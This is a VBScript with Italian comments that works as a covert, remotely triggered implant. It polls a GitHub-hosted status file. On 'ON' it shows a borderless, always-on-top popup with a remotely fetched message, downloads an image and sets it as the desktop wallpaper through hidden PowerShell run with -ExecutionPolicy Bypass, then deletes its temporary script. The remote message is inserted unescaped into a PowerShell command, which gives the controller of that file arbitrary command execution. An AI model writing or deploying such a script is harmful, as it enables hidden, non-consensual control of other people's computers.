Option Explicit
' On Error Resume Next ' Rimosso per debugging, riattivalo se vuoi che lo script sia silenzioso in caso di errori

Dim shell, fso, urlImmagine, urlMessaggio, urlStatus, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp, statusDalWeb

' --- CONFIGURAZIONE URL ---
urlImmagine  = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
' Questo è il file che userai per dare il via (scrivi ON per attivare, OFF per fermare)
urlStatus    = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/status.txt"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' --- INIZIO CICLO DI CONTROLLO ---
Do
    ' 1. Verifica se deve partire
    statusDalWeb = ""
    xmlHttp.Open "GET", urlStatus, False
    xmlHttp.Send
    If xmlHttp.Status = 200 Then
        statusDalWeb = UCase(Trim(xmlHttp.responseText))
    End If

    ' Se il file status.txt contiene "ON", esegue la logica
    If statusDalWeb = "ON" Then

        ' --- 2. RECUPERA IL MESSAGGIO ---
        messaggioDalWeb = ""
        xmlHttp.Open "GET", urlMessaggio, False
        xmlHttp.Send
        If xmlHttp.Status = 200 Then
            messaggioDalWeb = Trim(xmlHttp.responseText)
        End If

        ' --- 3. MOSTRA IL POPUP ---
        If messaggioDalWeb <> "" Then
            Dim comandoPopup
            comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
                "$form = New-Object System.Windows.Forms.Form; $form.Text = 'Sistema'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
                "$form.StartPosition = 'CenterScreen'; $form.FormBorderStyle = 'FixedDialog'; $form.ControlBox = $false; $form.TopMost = $true; " & _
                "$label = New-Object System.Windows.Forms.Label; $label.Text = '" & messaggioDalWeb & "'; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; " & _
                "$label.Font = New-Object System.Drawing.Font('Segoe UI', 11); " & _
                "$form.Controls.Add($label); $panel = New-Object System.Windows.Forms.Panel; $panel.Dock = 'Bottom'; $panel.Height = 50; " & _
                "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
                "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
            shell.Run comandoPopup, 0, True
        End If

        ' --- 4. CAMBIO SFONDO ---
        percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
        percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"

        scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
            "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
            "if (Test-Path '" & percorsoLocale & "') { " & _
            "$path = (Get-Item '" & percorsoLocale & "').FullName; " & _
            "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
            "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
            "$code = @' " & vbCrLf & _
            "using System; using System.Runtime.InteropServices; " & vbCrLf & _
            "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
            "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"

        Dim f
        Set f = fso.CreateTextFile(percorsoScript, True)
        f.Write scriptPS
        f.Close

        shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True

        ' Pulizia file temporaneo PS1
        WScript.Sleep 2000
        If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
        
        ' Opzionale: Una volta eseguito, potresti voler attendere molto tempo 
        ' o forzare lo "status" a OFF tramite un'altra chiamata web se non vuoi loop infiniti
    End If

    ' --- 5. ATTESA (Polling) ---
    ' Lo script dorme per 60 secondi (60000 millisecondi) prima di ricontrollare GitHub
    WScript.Sleep 60000 
Loop
